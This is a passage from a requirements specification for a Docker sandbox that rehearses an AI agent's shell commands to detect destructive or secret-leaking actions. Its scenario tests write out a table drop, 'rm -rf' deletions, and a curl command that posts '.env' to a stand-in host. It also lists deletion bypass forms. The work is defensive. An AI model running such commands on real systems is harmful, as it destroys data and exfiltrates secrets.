2. THE Box_Runner SHALL compute `verdict` as `WardEngine.evaluate(report, wardSet)` (called with `secretValues` and the payloads of `RunOutput.payloads`, per Requirements 8 and 9) combined, by maximum in `pass < warn < block` order, with the verdict floor: `warn` for `timeout`, `pipeline-deadline`, `copy-timeout`, `recorder-failure`, `secret-values-unreadable`, `sqlite-unreadable`, `external-change`, `protected-path-excluded`, missing secret-read recording for an `egress` ward, any `status` other than `ok`, and Plan_B; and `block` for `isolation-violation`.
3. THE Box_Runner SHALL return Runner_Verdict `pass` only when `status` is `"ok"`, `isolation.mode` is `"docker-box"`, and `WardEngine.evaluate` returns `pass`.
4. THE Run_Result SHALL include `copiedAt`, `box.source` (`"fresh"` or `"pool"`), the per-phase durations in milliseconds named as in the timing budget of Requirement 19, the exit code of every action, and the `isolation` object of Requirements 3, 4, 9, 10, and 13.
5. THE Box_Runner SHALL provide a function that serializes a Run_Result to JSON, and the serialized form SHALL parse back to a value deep-equal to the Run_Result with payload bytes replaced by byte length and SHA-256 hash (round-trip property after redaction).
6. FOR ALL Run_Results, serializing, parsing, and serializing again SHALL produce an identical JSON string.
7. FOR a Plan of length 1, THE `Change[]` in `report.changes[0]` from the Box_Runner pipeline SHALL be deep-equal to the `Change[]` produced by `ghostRun(repoWorld, snapshot, [action])` for the same Original and the same action on a repository fixture with at most 50 files.

### Requirement 15: Plan B Static Analysis

**User Story:** As a user without Docker, I want a conservative static check that never executes the command, so that I still get a warning for risky actions without a false sense of safety.

#### Acceptance Criteria

1. WHILE `isolation.mode` is `"static-analysis"`, THE Static_Analyzer SHALL parse each ShellAction without executing it, and SHALL return `report.changes` as empty arrays and `report.observedEvents` as `[]`.
2. WHEN a ShellAction contains an absolute path outside the Copy root, a path beginning with `~`, a symbolic link in the repository that points outside Original, or a database connection string (a URL with a scheme such as `postgres://` or `mysql://`), THE Static_Analyzer SHALL emit one `Effect` per finding with a non-empty `destination` and SHALL list the finding in `staticFindings`.
3. THE Box_Runner SHALL set Runner_Verdict to at least `warn` for every Plan analyzed in Plan_B, including a Plan with no findings, because no ghost rehearsal took place.
4. THE Run_Result of a Plan_B run SHALL state `rehearsed: false`.
5. THE Static_Analyzer SHALL NOT perform file writes, network calls, or process execution while analyzing a ShellAction.

### Requirement 16: Cleanup

**User Story:** As a user, I want no leftover containers or copies after a run, including after errors, so that repeated runs do not exhaust the disk or the Docker daemon.

#### Acceptance Criteria

1. WHEN a run finishes with any `status`, THE Box_Runner SHALL remove the container and delete the Copy with a Median_Of_5 of at most 1.0 s on the Reference_Machine.
2. IF an error is thrown in any phase after the Copier started, THEN THE Box_Runner SHALL still remove the container and delete the Copy before the error propagates to the caller.
3. THE Box_Runner SHALL label every container with `ghost-run.run-id=<uuid>`, where `<uuid>` is a random UUID not derived from the Plan, so that leftover containers can be found.
4. WHEN a run finishes, THE number of containers with the label `ghost-run.run-id=<uuid>` of that run SHALL be 0 and the Copy directory SHALL not exist.

### Requirement 17: Safety Contract Claims and Property Tests

**User Story:** As a reviewer, I want each safety property asserted only in its declared scope and tested with property-based tests, so that the claims are honest.

#### Acceptance Criteria

1. THE Box_Runner SHALL assert P1 only for runs with `isolation.mode` equal to `"docker-box"`; for such runs, FOR ALL Plans of length 1 to 50 over generated fixture trees, the Original fingerprint hash after the run SHALL equal the hash before the run, across 20 generated examples per property in the on-save run, at least 100 in the explicit command run, and at least 10,000 in the nightly run.
2. THE Box_Runner SHALL NOT assert P2 for the Repo_World, and the Repo_World SHALL be marked `deterministic: false`.
3. THE Box_Runner SHALL assert P3 for the Repo_World: FOR ALL fixture trees and Plans of length 1 to 50, the directory referred to by a Snapshot SHALL be unchanged by `step`, and two `step` sequences from the same Snapshot with the same actions SHALL yield equal diffs when the actions are deterministic fixture actions (file operations only, no time, no randomness, no PIDs).
4. WHERE P1 holds for a run, THE Box_Runner SHALL support the P5 claim: FOR ALL Plans that delete or overwrite a path matching a `path` ward, including the bypass forms `./data/../data/x`, symbolic links, globs, `find -delete`, move-then-delete, and script-hidden deletes, the `Change[]` SHALL contain a `file-deleted`, `file-overwritten`, or (for a replaced symbolic link) `symlink-changed` Change for the protected path.
5. WHERE `isolation.mode` is `"docker-box"` and `isolation.p6Claimed` is `true`, THE Box_Runner SHALL support the P6 claim: FOR ALL Plans that read a file matching an egress ward secret pattern and then attempt a network connection, the report SHALL contain a `secret-read` event with a `stepIndex` less than or equal to the `stepIndex` of a `network-attempt` event.
6. THE Box_Runner SHALL NOT assert P6 for `isolation.mode` equal to `"static-analysis"`.
7. THE property tests that need Docker SHALL use fixture trees of at most 50 files and SHALL report `skipped (docker unavailable)`, not `passed`, when Docker is unavailable.
8. THE on-save run of the P1 and P3 property tests for the Repo_World (triggered by the `contract-pbt` hook) SHALL use 20 generated examples per property and SHALL finish within 60 s, the Hook_Limit; a run of at least 100 examples per property SHALL be started only by an explicit command, and a run of at least 10,000 examples per property SHALL be the nightly run, each with no time limit.
9. THE Box_Runner SHALL pass the `core` Safety_Contract gate (`verifyWorld`) for the Repo_World with `deterministic: false` before the Repo_World is registered.

### Requirement 18: Scenario Acceptance Tests

**User Story:** As a demo author, I want the five Ghost Shell scenarios reproducible as automated tests of the runner, so that the demo claims are backed by evidence.

#### Acceptance Criteria

1. WHEN the action `sqlite3 app.db "DROP TABLE users;"` runs against the fixture repository, THE Box_Runner SHALL return a `sql-row-count` Change with `table: "users"`, `rowsBefore: 1206`, `rowsAfter: 0`, and `dropped: true`.
2. WHEN the action `rm -rf ./data ./build` runs against the fixture repository, THE Box_Runner SHALL return a `file-deleted` Change for every file under `data/` and `build/` of the fixture.
3. WHEN the action `curl -d @.env https://setup-check.example` runs against a fixture whose `.env` contains the Canary `sk-CANARY-abc123`, THE Box_Runner SHALL return a `secret-read` event with `path: ".env"` and a `network-attempt` event with a destination beginning with `setup-check.example`, with the `secret-read` `stepIndex` less than or equal to the `network-attempt` `stepIndex`, and the captured payload hash SHALL equal the SHA-256 of a body that contains the Canary.
4. WHEN the action `npm test` runs against the fixture repository, THE Box_Runner SHALL return `changes[0]` equal to `[]` for fixture-owned paths, no event with destination `registry.npmjs.org`, and a Median_Of_5 total run time (copy to Run_Result) of less than 3.0 s on the Reference_Machine.
5. WHEN the action `npm run clean` runs against a fixture whose `package.json` script `clean` executes `rm -rf data`, THE Box_Runner SHALL return a `file-deleted` Change for every file under `data/`.
6. WHEN a run in scenarios 1 to 5 completes, THE serialized Run_Result, the log output, the graveyard output, and every file written by the Box_Runner outside the Copy SHALL contain none of the Canary value (including after `secretValues` was read into memory under Requirement 9 criterion 9), and THE Original fingerprint hash SHALL equal its pre-run value.
7. WHEN a ward allowlist example is needed in fixtures, THE fixture `wards.yaml` SHALL use `registry.npmjs.org` as the example `allow_hosts` entry, and every other hostname in fixtures SHALL use a reserved domain suffix (`.example`, `.test`, `.localhost`, or `.invalid`) or a documentation IP address (`192.0.2.0/24`).

### Requirement 19: Non-Functional Requirements, Timing Budget, and Platform

**User Story:** As a hook user, I want a stated time budget per phase, so that regressions are detectable and the 60 s Hook_Limit is respected.

#### Acceptance Criteria

1. THE Box_Runner SHALL meet the following per-phase budget for a one-action Plan against the Reference_Repo on the Reference_Machine, and SHALL report each measured phase duration in the Run_Result. Each budget is a Median_Of_5 target, except rows marked "absolute limit", which apply to every run:

| Phase | Name in Run_Result | Budget (Median_Of_5 unless marked) |
|---|---|---|
| Docker availability check | `dockerCheckMs` | 2.0 s (absolute limit) |
| Fingerprint before | `fingerprintBeforeMs` | 1.0 s |
| Copy | `copyMs` | 1.0 s |
| Manifest and SQLite baseline | `baselineMs` | 0.8 s |
| Box start, inspect, and remove (fresh) | `boxOverheadMs` | 0.8 s (pool: 0.65 s) |
| Action execution including Recorder | `execMs` | at most the Box execution limit (default 25 s, maximum 30 s; absolute limit) |
| Diff per step | `diffMs` | 0.5 s |
| SQLite row counts | `sqliteMs` | 0.5 s |
| Fingerprint after | `fingerprintAfterMs` | 1.0 s |
| Cleanup | `cleanupMs` | 1.0 s |

2. THE sum of all phase budgets except `execMs` SHALL be at most 8.6 s, so that a run at the budgets with the maximum `execMs` of 30 s stays below 39 s and leaves more than 20 s of margin below the Hook_Limit; the Absolute_Limits (Docker availability check 2 s, copy 20 s, Box execution 30 s, pipeline 55 s) SHALL bound any single slower run.
3. FOR each Plan step after the first, THE Box_Runner SHALL add a Median_Of_5 of at most 0.6 s (diff 0.5 s plus step overhead 0.1 s) to the run, and the pipeline deadline of Requirement 7 SHALL bound runs of long Plans.
4. THE Box_Runner SHALL complete a run of the five scenarios of Requirement 18 with a total time from the start of the copy to the return of the Run_Result of at most 30 s each, as a Median_Of_5 per scenario, on the Reference_Machine.
5. THE timing measurement task SHALL record the measured values (the Median_Of_5 and the maximum of each phase and scenario) in `docs/devlog.md`; this is a process requirement on the task, not runtime behavior of the Box_Runner.
6. THE Box_Runner SHALL support macOS and Linux and SHALL document Windows as unverified.
7. THE Box_Runner SHALL read no `.env` value other than Canary values in tests, demos, and fixtures, and SHALL contain no committed real credential.
8. THE repository files of the Box_Runner SHALL contain no hidden Unicode characters (U+E0000 to U+E007F, U+200B to U+200D outside emoji sequences, U+2060, U+FEFF, U+202A to U+202E, U+2066 to U+2069); tests that need such characters SHALL build them with escape sequences.

## Out of Scope

- The in-memory file system world and the sql.js world of the Playground (separate worlds under `worlds/`).
- Ward rule evaluation logic, `wards.yaml` parsing, and content inspection of captured payloads (the `wards` spec); this spec only supplies Changes, events, and in-memory captures.
- The read-only safe-list of commands that skip the ghost run, the Kiro hook scripts, hook exit-code handling, and the Post Tool Use log (the `kiro-integration` spec).
- The MCP server and the Kiro power.
- Possession detection, red thread tracing, and blacklight scanning (the `possession` spec).
- UI, candle, graveyard, and seance screens (the `ui-kit` spec).
- Ghost Hand (MuJoCo) and Ghost Cloud (moto) worlds.
- Kiro Crew integration.
- Replacing a full isolation tool, and detection of every injection by text analysis.
- Docker image publishing and CI; the box image Dockerfile is part of this package, but the registry workflow is not specified here.
- Windows support.
- A folder-level `clonefile(2)` helper (optional, only the interface of Requirement 4 criterion 7).

## Open Items for the Design Phase

- Recording method and cost of secret-read recording (Requirement 9, measured trial).
- Where the Recorder output is stored outside the Copy. Binding of ports 53, 80, and 443 under `--cap-drop ALL` was confirmed by experiment A and is covered by the verification test of Requirement 8 criterion 13.
- How the baseline hash of `ctime` candidates is obtained without hashing unchanged files.
- Whether the Box image is built locally or pulled by digest.
- Update of `.kiro/steering/structure.md` to list `ghost-runner/` and its dependency direction.
- For the tasks phase: the timing measurement task (Requirement 19 criterion 5) and the secret-read recording trial (Requirement 9 criteria 5 and 6) record their results in `docs/devlog.md` and `docs/research.md`. Both are task work, not runtime behavior.
- The exact shape of the `secretValues` hand-off type and of the `WardEngine.evaluate` parameter that carries it (Requirement 1 criteria 6 and 7, Requirement 9 criterion 10).
- The `contract-pbt` hook configuration (`kiro-integration` spec) must select 20 examples per property for the Repo_World on save (Requirement 17 criterion 8).
